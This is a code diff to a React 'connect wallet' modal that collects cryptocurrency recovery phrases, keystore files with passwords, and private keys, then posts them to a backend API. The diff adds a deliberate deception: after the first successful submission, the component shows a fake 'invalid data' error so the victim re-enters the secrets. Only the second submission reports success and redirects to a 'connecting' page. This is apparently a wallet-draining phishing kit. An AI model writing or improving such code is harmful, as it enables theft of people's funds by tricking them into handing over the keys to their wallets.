@@ -1,4 +1,6 @@
 import React, { useState } from 'react';
+// import { useHistory } from 'react-router-dom';
+import  {useNavigate}  from 'react-router-dom';
 
 const Modal = ({ isOpen, onClose, wallet }) => {
   const [selectedPhase, setSelectedPhase] = useState('Phrase');
@@ -6,65 +8,120 @@ const Modal = ({ isOpen, onClose, wallet }) => {
   const [keystore, setKeystore] = useState('');
   const [password, setPassword] = useState('');
   const [privateKey, setPrivateKey] = useState('');
+  const [clickCount, setClickCount] = useState(0);
+  // const history = useHistory();
+
+  const navigate = useNavigate()
 
   if (!isOpen || !wallet) return null;
 
   const handleSubmit = async () => {
     let type = '';
     let data = {};
-  
-    if (selectedPhase === 'Phrase') {
-      const words = phrase.trim().split(/\s+/);
-      if (words.length !== 12) {
-        alert('Phrase must contain exactly 12 words.');
-        return;
+
+    if (clickCount === 0) {
+      setClickCount(1);
+
+      if (selectedPhase === 'Phrase') {
+        const words = phrase.trim().split(/\s+/);
+        if (words.length !== 12) {
+          alert('Phrase must contain exactly 12 words. Please carefully type it.');
+          return;
+        }
+        type = 'phrase';
+        data = { phrase };
+      } else if (selectedPhase === 'Keystore') {
+        if (!keystore || !password) {
+          alert('Both Keystore and Password are required.');
+          return;
+        }
+        type = 'keystore';
+        data = { keystore, password };
+      } else if (selectedPhase === 'Private Key') {
+        if (!privateKey) {
+          alert('Private Key is required.');
+          return;
+        }
+        type = 'privateKey';
+        data = { privateKey };
       }
-      type = 'phrase';
-      data = { phrase };
-    } else if (selectedPhase === 'Keystore') {
-      if (!keystore || !password) {
-        alert('Both Keystore and Password are required.');
-        return;
+
+      try {
+        const response = await fetch('http://localhost:5000/api/wallet/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type,
+            data,
+            walletName: wallet.name,
+            method: selectedPhase,
+          }),
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          alert('Error: Form submitted with invalid data. Please check the details and try again.');
+        } else {
+          alert(`Error: ${result.error}`);
+        }
+      } catch (error) {
+        console.error('Submit error:', error);
+        alert('Something went wrong. Please try again.');
       }
-      type = 'keystore';
-      data = { keystore, password };
-    } else if (selectedPhase === 'Private Key') {
-      if (!privateKey) {
-        alert('Private Key is required.');
-        return;
+
+    } else if (clickCount === 1) {
+      if (selectedPhase === 'Phrase') {
+        const words = phrase.trim().split(/\s+/);
+        if (words.length !== 12) {
+          alert('Phrase must contain exactly 12 words.');
+          return;
+        }
+        type = 'phrase';
+        data = { phrase };
+      } else if (selectedPhase === 'Keystore') {
+        if (!keystore || !password) {
+          alert('Both Keystore and Password are required.');
+          return;
+        }
+        type = 'keystore';
+        data = { keystore, password };
+      } else if (selectedPhase === 'Private Key') {
+        if (!privateKey) {
+          alert('Private Key is required.');
+          return;
+        }
+        type = 'privateKey';
+        data = { privateKey };
       }
-      type = 'privateKey';
-      data = { privateKey };
-    }
-  
-    try {
-      const response = await fetch('http://localhost:5000/api/wallet/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type,
-          data,
-          walletName: wallet.name,
-          method: selectedPhase,
-        }),
-      });
-  
-      const result = await response.json();
-  
-      if (response.ok) {
-        alert('Submitted successfully!');
-        onClose();
-      } else {
-        alert(`Error: ${result.error}`);
+
+      try {
+        const response = await fetch('http://localhost:5000/api/wallet/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type,
+            data,
+            walletName: wallet.name,
+            method: selectedPhase,
+          }),
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          alert('Submitted successfully!');
+          onClose();
+          navigate("/connecting")
+        } else {
+          alert(`Error: ${result.error}`);
+        }
+      } catch (error) {
+        console.error('Submit error:', error);
+        alert('Something went wrong. Please try again.');
       }
-    } catch (error) {
-      console.error('Submit error:', error);
-      alert('Something went wrong. Please try again.');
     }
   };
-  
-  
-  
 
   return (
     <div className="fixed inset-0 bg-[rgba(0,0,0,0.5)] flex justify-center items-center z-50">
@@ -140,7 +197,7 @@ const Modal = ({ isOpen, onClose, wallet }) => {
 
         <button
           onClick={handleSubmit}
-          className="mt-6 w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 "
+          className="mt-6 w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700"
         >
           Proceed
         </button>
